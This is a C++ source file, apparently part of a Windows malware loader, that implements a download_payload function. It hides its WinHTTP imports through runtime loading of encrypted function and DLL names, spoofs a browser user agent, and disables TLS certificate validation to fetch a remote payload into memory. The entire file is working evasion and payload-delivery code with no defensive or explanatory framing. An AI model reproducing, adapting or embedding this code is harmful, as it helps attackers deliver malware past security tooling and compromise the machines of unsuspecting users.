// language: C++20, target: Windows 11
// dynamic winhttp loading — DLL imports only kernel32

#include "downloader.h"
#include "crypt.h"
#include <windows.h>
#include <winhttp.h>

typedef HINTERNET(WINAPI* pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET(WINAPI* pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL(WINAPI* pWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL(WINAPI* pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* pWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL(WINAPI* pWinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
typedef BOOL(WINAPI* pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL(WINAPI* pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* pWinHttpCloseHandle)(HINTERNET);

struct WinHttpApi {
    pWinHttpOpen Open;
    pWinHttpConnect Connect;
    pWinHttpOpenRequest OpenRequest;
    pWinHttpSetOption SetOption;
    pWinHttpSendRequest SendRequest;
    pWinHttpReceiveResponse ReceiveResponse;
    pWinHttpQueryHeaders QueryHeaders;
    pWinHttpQueryDataAvailable QueryDataAvailable;
    pWinHttpReadData ReadData;
    pWinHttpCloseHandle CloseHandle;
    HMODULE mod;
};

static bool load_api(WinHttpApi& api) {
    static constexpr auto enc_dll = ENC("winhttp.dll");
    auto dll = DEC(enc_dll);
    api.mod = LoadLibraryA(dll);
    if (!api.mod) return false;

    static constexpr auto e0 = ENC("WinHttpOpen");
    static constexpr auto e1 = ENC("WinHttpConnect");
    static constexpr auto e2 = ENC("WinHttpOpenRequest");
    static constexpr auto e3 = ENC("WinHttpSetOption");
    static constexpr auto e4 = ENC("WinHttpSendRequest");
    static constexpr auto e5 = ENC("WinHttpReceiveResponse");
    static constexpr auto e6 = ENC("WinHttpQueryHeaders");
    static constexpr auto e7 = ENC("WinHttpQueryDataAvailable");
    static constexpr auto e8 = ENC("WinHttpReadData");
    static constexpr auto e9 = ENC("WinHttpCloseHandle");

    auto d0 = DEC(e0); auto d1 = DEC(e1); auto d2 = DEC(e2);
    auto d3 = DEC(e3); auto d4 = DEC(e4); auto d5 = DEC(e5);
    auto d6 = DEC(e6); auto d7 = DEC(e7); auto d8 = DEC(e8);
    auto d9 = DEC(e9);

    api.Open = (pWinHttpOpen)GetProcAddress(api.mod, d0);
    api.Connect = (pWinHttpConnect)GetProcAddress(api.mod, d1);
    api.OpenRequest = (pWinHttpOpenRequest)GetProcAddress(api.mod, d2);
    api.SetOption = (pWinHttpSetOption)GetProcAddress(api.mod, d3);
    api.SendRequest = (pWinHttpSendRequest)GetProcAddress(api.mod, d4);
    api.ReceiveResponse = (pWinHttpReceiveResponse)GetProcAddress(api.mod, d5);
    api.QueryHeaders = (pWinHttpQueryHeaders)GetProcAddress(api.mod, d6);
    api.QueryDataAvailable = (pWinHttpQueryDataAvailable)GetProcAddress(api.mod, d7);
    api.ReadData = (pWinHttpReadData)GetProcAddress(api.mod, d8);
    api.CloseHandle = (pWinHttpCloseHandle)GetProcAddress(api.mod, d9);

    return api.Open && api.Connect && api.OpenRequest && api.SetOption
        && api.SendRequest && api.ReceiveResponse && api.QueryHeaders
        && api.QueryDataAvailable && api.ReadData && api.CloseHandle;
}

static constexpr auto enc_ua = WENC(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

bool download_payload(const wchar_t* host, const wchar_t* path,
                      int port, bool use_tls,
                      std::vector<uint8_t>& out) {

    WinHttpApi api{};
    if (!load_api(api)) return false;

    auto ua = WDEC(enc_ua);

    HINTERNET session = api.Open(
        ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;

    HINTERNET connect = api.Connect(session, host, static_cast<INTERNET_PORT>(port), 0);
    if (!connect) { api.CloseHandle(session); return false; }

    DWORD flags = use_tls ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET request = api.OpenRequest(
        connect, L"GET", path, nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!request) {
        api.CloseHandle(connect);
        api.CloseHandle(session);
        return false;
    }

    if (use_tls) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                        | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                        | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        api.SetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
    }

    if (!api.SendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                         WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        api.CloseHandle(request);
        api.CloseHandle(connect);
        api.CloseHandle(session);
        return false;
    }

    if (!api.ReceiveResponse(request, nullptr)) {
        api.CloseHandle(request);
        api.CloseHandle(connect);
        api.CloseHandle(session);
        return false;
    }

    DWORD status_code = 0;
    DWORD sz = sizeof(status_code);
    api.QueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                     WINHTTP_HEADER_NAME_BY_INDEX, &status_code, &sz, WINHTTP_NO_HEADER_INDEX);
    if (status_code != 200) {
        api.CloseHandle(request);
        api.CloseHandle(connect);
        api.CloseHandle(session);
        return false;
    }

    DWORD available = 0;
    while (api.QueryDataAvailable(request, &available) && available > 0) {
        size_t offset = out.size();
        out.resize(offset + available);
        DWORD read = 0;
        api.ReadData(request, out.data() + offset, available, &read);
        out.resize(offset + read);
    }

    api.CloseHandle(request);
    api.CloseHandle(connect);
    api.CloseHandle(session);
    return !out.empty();
}
